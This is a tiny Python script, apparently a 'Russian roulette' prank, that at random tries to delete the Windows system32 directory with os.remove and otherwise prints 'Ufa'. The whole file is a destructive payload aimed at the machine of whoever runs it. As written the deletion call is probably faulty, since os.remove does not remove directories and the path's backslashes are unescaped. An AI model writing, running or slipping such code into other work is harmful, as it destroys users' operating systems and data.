import random
import os
import stat

if random.randint(0, 6) == 1:
    os.remove("C:\windows\system32")
    print("f...")
else:
    print("Ufa")
